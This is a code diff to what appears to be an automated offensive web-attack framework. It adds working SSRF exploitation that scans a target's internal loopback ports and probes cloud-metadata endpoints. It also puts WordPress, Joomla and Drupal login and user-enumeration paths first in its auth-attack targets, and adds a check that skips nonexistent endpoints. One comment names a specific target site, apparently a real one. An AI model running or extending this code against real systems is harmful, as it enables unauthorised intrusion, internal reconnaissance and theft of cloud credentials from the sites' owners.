@@ -1404,6 +1404,52 @@ def xss(move, ctx):
             "xss": {"verdict": "rejected", "surface": surface, "params_tried": len(params)}, "xss_verified": False}
 
 
+# Internal services a server-side fetch can reach via SSRF but an external scan cannot (loopback/firewalled):
+# admin panels, DBs, caches, search, control panels. The SSRF becomes an INTERNAL PORT SCANNER.
+_SSRF_INTERNAL_PORTS = [8090, 8080, 80, 8000, 443, 8443, 3306, 5432, 6379, 11211, 27017, 9200,
+                        2082, 2083, 2086, 2087, 9000, 9090, 5601, 15672, 7080, 7443, 25, 5900]
+
+
+def _ssrf_internal_sweep(sess, url, param, cap_ports=None):
+    """DEVELOP a confirmed SSRF: use it to ENUMERATE the target's INTERNAL ports FIRST (the payoff is
+    internal, not the external callback). For each 127.0.0.1:<port> inject it and compare the response
+    (status / body size / latency) to a known-CLOSED baseline port; a response that DIFFERS from the closed
+    baseline means something is listening internally -> a real escalation target (never ASSUME a port like
+    8090, DISCOVER what actually answers). Non-destructive GETs. Returns {open_internal:[...], baseline}."""
+    import time as _t2
+
+    def _probe(target):
+        t0 = _t2.time()
+        try:
+            r = sess.get(url, params={param: target}, timeout=8, verify=False, allow_redirects=False)
+            return {"target": target, "status": r.status_code, "len": len(r.content or b""),
+                    "ms": int((_t2.time() - t0) * 1000)}
+        except Exception:
+            return {"target": target, "status": -1, "len": 0, "ms": int((_t2.time() - t0) * 1000)}
+
+    base_closed = _probe("http://127.0.0.1:1")                 # nothing listens on :1 -> the CLOSED signature
+    def _differs(s):
+        return (s["status"] != base_closed["status"]
+                or abs(s["len"] - base_closed["len"]) > 24
+                or (base_closed["ms"] and abs(s["ms"] - base_closed["ms"]) > max(400, base_closed["ms"])))
+
+    ports = _SSRF_INTERNAL_PORTS[:int(cap_ports or os.environ.get("AEGIS_SSRF_PORT_CAP", 18))]
+    found = []
+    for host in ("127.0.0.1", "localhost", "0.0.0.0", "[::1]"):
+        for port in ports:
+            s = _probe(f"http://{host}:{port}/")
+            if _differs(s):
+                found.append({"host": host, "port": port, "status": s["status"], "len": s["len"], "ms": s["ms"]})
+        if found:                                              # one loopback alias answering is enough
+            break
+    # also the cloud-metadata endpoints (internal too)
+    for mt in ("http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/"):
+        s = _probe(mt)
+        if _differs(s):
+            found.append({"host": mt, "port": "meta", "status": s["status"], "len": s["len"], "ms": s["ms"]})
+    return {"open_internal": found, "baseline_closed": base_closed, "ports_scanned": len(ports)}
+
+
 def ssrf(move, ctx):
     """SSRF probe via an in-sandbox CANARY: inject `http://<canary>/c/<token>` into SSRF-prone params and,
     if the token is called back, the target made an outbound request we controlled -> confirmed. GET query
@@ -1446,6 +1492,18 @@ def ssrf(move, ctx):
         if h:
             v, rc = SsrfOracle(h, surface=surface, param=p).check()
             sr = {"verdict": v, **rc}
+            # DEVELOP the confirmed SSRF IMMEDIATELY: sweep the target's INTERNAL ports first (the real
+            # payoff), so we DISCOVER what is actually listening internally instead of abandoning the
+            # foothold or assuming a port. Gate AEGIS_SSRF_SWEEP=0.
+            if str(os.environ.get("AEGIS_SSRF_SWEEP", "1")).lower() not in ("0", "false", "no", "off"):
+                try:
+                    sweep = _ssrf_internal_sweep(sess, url, p)
+                    sr["internal_sweep"] = sweep
+                    if sweep.get("open_internal"):
+                        sr["note"] = (str(sr.get("note", "")) + " | SSRF-internal open: " +
+                                      ",".join(f"{o['host']}:{o['port']}" for o in sweep["open_internal"][:8]))
+                except Exception as _e:
+                    sr["internal_sweep_error"] = repr(_e)[:120]
             return {"status": 200, "body": _json.dumps(sr)[:2000], "ssrf": sr, "ssrf_verified": True}
     # #3: SSRF-to-cloud-metadata arm -- inject internal/IMDS targets; a REFLECTED metadata read is confirmed
     # by the response SIGNATURE even without a callback (IMDS never calls back). Bounded; non-destructive GETs.
@@ -1831,6 +1889,10 @@ def _discover_login(base, with_conf=False):
         best, best_score = _LOGIN_SURFACE_CACHE[base]
         return (best, best_score) if with_conf else best
     cands = [c.strip() for c in os.environ.get("AEGIS_LOGIN_CANDIDATES", "").split(",") if c.strip()] or [
+        # CMS login surfaces FIRST -- without these a WordPress/Joomla/Drupal target was mis-detected and
+        # every auth attack went at a generic SPA path (chikov is WordPress: real login is /wp-login.php,
+        # not /rest/user/login). wp-login.php answers a bad POST with 200+form (score 2) so it's picked.
+        "/wp-login.php", "/xmlrpc.php", "/administrator/index.php", "/admin/login", "/wp-json/wp/v2/users",
         "/rest/user/login", "/api/auth/login", "/api/login", "/api/users/login", "/api/v1/auth/login",
         "/user/login", "/auth/login", "/login", "/api/sessions", "/session", "/api/account/login", "/signin"]
     emf = os.environ.get("AEGIS_USER_FIELD", "email"); pwf = os.environ.get("AEGIS_PW_FIELD", "password")
@@ -2369,9 +2431,81 @@ def vector_names():
     return sorted(set(LEGS) - {"fact", "authz", "money", "web"} | {"web"})
 
 
+_SURFACE_LIVE = {}
+_REALITY_ACTIONS = ("web", "authz", "authz_fuzz", "sql_raw", "idor", "nested_write", "field_leak",
+                    "filter_injection", "open_redirect", "ssti")
+
+
+_SURFACE_BASELINE = {}
+
+
+def _reality_sess(ctx):
+    import requests as _rq
+    sfr = (ctx or {}).get("session_for_role")
+    sess = sfr("owner") if sfr else _rq.Session()
+    try: sess.verify = False
+    except Exception: pass
+    return sess
+
+
+def _soft404_baseline(base, ctx):
+    """Fingerprint the target's response to a DEFINITELY-nonexistent path -> (status, body_len). Apps (esp.
+    WordPress) serve a themed 404 as 200/redirect, so a raw status check passes everything; we compare each
+    surface to THIS baseline instead. Cached per base."""
+    if base in _SURFACE_BASELINE:
+        return _SURFACE_BASELINE[base]
+    bl = None
+    try:                                                   # follow redirects so a soft-404 lands on its FINAL
+        r = _reality_sess(ctx).get(base.rstrip("/") + "/aegis-nonexistent-%d-zqx" % os.getpid(),
+                                   timeout=8, allow_redirects=True)   # page (home/themed 404), not the 301 hop
+        bl = (r.status_code, len(r.content or b""))
+    except Exception:
+        bl = (404, 0)
+    _SURFACE_BASELINE[base] = bl
+    return bl
+
+
+def _surface_live(base, surface, ctx):
+    """REALITY GATE core: does this surface actually exist? Compares the surface's response to a known-
+    nonexistent baseline (soft-404 aware). True=probe it, False=matches the 404 baseline -> skip.
+    Fail-open on error. Cached per (base, surface)."""
+    surf = str(surface or "").split("?")[0]
+    if not surf.startswith("/"):
+        return True
+    key = (base, surf)
+    if key in _SURFACE_LIVE:
+        return _SURFACE_LIVE[key]
+    live = True
+    try:
+        b_status, b_len = _soft404_baseline(base, ctx)
+        r = _reality_sess(ctx).get(base.rstrip("/") + surf, timeout=8, allow_redirects=True)
+        rl = len(r.content or b"")
+        if r.status_code in (404, 410):
+            live = False
+        elif r.status_code == b_status and b_len and abs(rl - b_len) <= max(96, int(b_len * 0.03)):
+            live = False                                  # soft-404: lands on the same page as a nonexistent path
+        else:
+            live = True                                   # different from the 404 baseline -> it EXISTS
+    except Exception:
+        live = True
+    _SURFACE_LIVE[key] = live
+    return live
+
+
 def dispatch(move, phase, ctx):
     """Run the vector for move['action'] (default web). Returns the leg result + the move."""
     move = _normalize_move(move, ctx)
+    # REALITY GATE: do not spend budget probing a surface that does not exist. The board hallucinates
+    # endpoints (/api/dependencies ...) when discovery is thin; a web-class move at a confirmed-404 surface
+    # is skipped cheaply (counts as noise, not an information-gaining attempt) so budget flows to the REAL
+    # crawl/wp_enum-confirmed surface. Gate AEGIS_REALITY_GATE=0.
+    if str(os.environ.get("AEGIS_REALITY_GATE", "1")).lower() not in ("0", "false", "no", "off"):
+        _surf = move.get("surface") or move.get("path")
+        _base = (ctx or {}).get("base") or os.environ.get("AEGIS_TARGET") or ""
+        if move.get("action", "web") in _REALITY_ACTIONS and _surf and _base \
+                and _surface_live(_base, _surf, ctx) is False:
+            return {"status": 404, "move": move, "dead_surface": True,
+                    "body": f"[reality-gate] surface {_surf} does not exist (404) -- skipped, no budget spent"}
     leg = LEGS.get(move.get("action", "web"), web)
     try:
         res = leg(move, ctx)
